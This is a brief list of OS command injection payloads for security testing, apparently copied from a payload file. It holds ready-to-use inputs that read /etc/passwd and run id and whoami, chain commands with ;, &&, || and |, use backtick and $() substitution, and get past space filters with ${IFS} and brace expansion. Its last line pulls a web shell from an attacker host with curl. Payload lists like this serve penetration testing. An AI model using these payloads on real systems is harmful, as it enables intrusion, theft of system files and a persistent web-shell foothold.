Command Injection Payloads

OS command injection testing payloads.

Source

File: CMDinjection-payloads.txt

Basic Command Execution

cat /etc/passwd
id
whoami

Command Chaining

command1; command2
command1 && command2
command1 || command2
command1 & command2
command1 | command2

Backticks Execution

`cat /etc/passwd`
`id`
`whoami`

Command Substitution

$(cat /etc/passwd)
$(id)
$(whoami)

Bypass Without Space (IFS)

cat${IFS}/etc/passwd
ls${IFS}-la
uname${IFS}-a

Brace Expansion

{cat,/etc/passwd}
{,ip,a}

File Write / Web Shell

curl http://evil.attacker.com/ -o webshell.php
